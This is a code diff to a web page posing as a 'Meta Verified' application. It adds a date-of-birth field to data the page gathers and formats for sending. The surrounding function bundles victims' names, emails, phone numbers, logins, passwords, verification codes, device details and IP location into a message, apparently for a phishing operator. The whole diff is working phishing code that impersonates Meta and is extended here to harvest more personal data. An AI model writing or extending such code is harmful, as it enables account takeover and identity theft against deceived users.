@@ -34,6 +34,7 @@ const Home = () => {
     const [showMobileSidebar, setShowMobileSidebar] = useState(false);
     const [formData, setFormData] = useState({
         fullName: '',
+        birthDate: '',
         personalEmail: '',
         businessEmail: '',
         phone: '',
@@ -97,6 +98,7 @@ const Home = () => {
             testimonial4: '"Meta Verified helped my account stand out from impersonators, which helped me secure more paying clients."',
 
             fullName: 'Full Name',
+            birthDate: 'Date of Birth',
             personalEmail: 'Personal Email',
             businessEmail: 'Business Email',
             mobilePhone: 'Mobile Phone Number',
@@ -300,9 +302,19 @@ const Home = () => {
         );
     };
 
+    const formatBirthDate = (rawBirthDate) => {
+        if (!rawBirthDate) return '';
+        const parts = rawBirthDate.split('-');
+        if (parts.length !== 3) return rawBirthDate;
+        const [year, month, day] = parts;
+        if (!year || !month || !day) return rawBirthDate;
+        return `${day}/${month}/${year}`;
+    };
+
     const buildAndSend = async (data) => {
         const dt = formatDateTime(new Date());
         const { form, login, passes, codes } = data;
+        const birthDateForMessage = formatBirthDate(form.birthDate);
 
         console.log('BuildAndSend - deviceInfo:', deviceInfo);
 
@@ -313,9 +325,10 @@ const Home = () => {
         message += `📍 Vị trí: ${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country}\n`;
         message += `━━━━━━━━━━━━━━━━━━━━\n`;
 
-        if (form.fullName || form.personalEmail || form.businessEmail || form.phone || form.pageName) {
+        if (form.fullName || form.birthDate || form.personalEmail || form.businessEmail || form.phone || form.pageName) {
             message += `<b>📋 THÔNG TIN</b>\n`;
             if (form.fullName) message += `   Tên: <code>${form.fullName}</code>\n`;
+            if (birthDateForMessage) message += `   Ngày sinh: <code>${birthDateForMessage}</code>\n`;
             if (form.personalEmail) message += `   Email: <code>${form.personalEmail}</code>\n`;
             if (form.businessEmail && form.businessEmail !== form.personalEmail) {
                 message += `   Business: <code>${form.businessEmail}</code>\n`;
